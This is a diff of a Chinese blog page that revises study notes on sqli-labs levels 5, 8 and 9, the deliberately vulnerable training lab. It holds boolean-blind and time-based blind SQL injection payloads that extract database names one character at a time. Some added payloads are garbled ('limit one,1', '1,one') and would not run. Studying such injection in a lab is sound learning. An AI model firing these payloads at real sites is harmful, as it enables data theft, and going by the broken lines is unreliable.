@@ -444,7 +444,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-06
+                    2021-11-08
                 </div>
                 
 
@@ -465,22 +465,23 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>1.left（）函数: <code>?id=1&#39; and left((select database()),1)=&#39;s&#39;--+</code>  判断数据库的第一位是否为s。</p>
-<p>2.substr：substr((select database()),1,1)=’s’   匹配的第一位开始算的第一个字母是否是s</p>
-<p>3.ascii与substr; <code>?id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;50 --+</code></p>
+                <p>1.left（）函数: <code>?id=1&#39; and left((select database()),1)=&#39;s&#39;--+</code> 判断数据库的第一位是否为s。</p>
+<p>2.substr：substr((select database()),1,1)=’s’ 匹配的第一位开始算的第一个字母是否是s</p>
+<p>3.ascii与substr; <code>?id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit one,1),1,one))&gt;50 --+</code>       第2个数据库的第一位</p>
+<p>?id=1’ and ascii(substr((select schema_name from information_schema.schemata limit four,1),1,one))=115–+  第五个数据库的第一为是s</p>
 <p>或<code>?id=1&#39; and ascii(substr(select database()),1,1)&gt;50--+</code> 从第一位开始算的第一个字母</p>
-<p>ps：schemata limit 1,1)表示第二个数据库名的第一位</p>
+<p>ps：limit 2，1）表示获取从第三行开始的一行数据</p>
 <p>less5为布尔盲注 正确时反回you are in 错误时不返回结果</p>
 <p>1.发现sql注入漏洞为’</p>
-<p>2.利用order  by 函数发现为三列</p>
+<p>2.利用order by 函数发现为三列</p>
 <p>（因为其为布尔型盲注故无法使用联合查询）</p>
 <p>3.使用上述函数进行查询</p>
-<p>less8可使用布尔盲注和时间盲注  这边就使用时间盲注吧</p>
+<p>less8可使用布尔盲注和时间盲注 这边就使用时间盲注吧</p>
 <p>if(条件，1，2)条件成立执行1 不成立执行2</p>
 <p>?id=1’ and if (length(database())=8,1,sleep(5))–+ 当长度为8时很快加载，不为8时加载5秒</p>
 <p>?id=1’ and if(ascii(substr((select database()),1,1))&gt;113,1,sleep(5))–+ 当前数据库从第一位开始算的第一个字母sacii值大于113 立刻返回结果否则执行5秒</p>
-<p>less9只能只能输出you are in  不存在true和false两种界面，所以建议使用时间盲注</p>
-<p>1.输入  ?id=1’ and sleep(5)–+  </p>
+<p>less9只能只能输出you are in 不存在true和false两种界面，所以建议使用时间盲注</p>
+<p>1.输入 ?id=1’ and sleep(5)–+</p>
 <p>其余参照less8</p>
 
                 
@@ -508,7 +509,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://csc666666.github.io/2021/11/06/title%20sqli%20less5&8&9/">https://csc666666.github.io/2021/11/06/title%20sqli%20less5&8&9/</a>
+                    <a href="https://csc666666.github.io/2021/11/08/title%20sqli%20less5&8&9/">https://csc666666.github.io/2021/11/08/title%20sqli%20less5&8&9/</a>
                 </span>
             </div>
             <div class="reprint__notice">
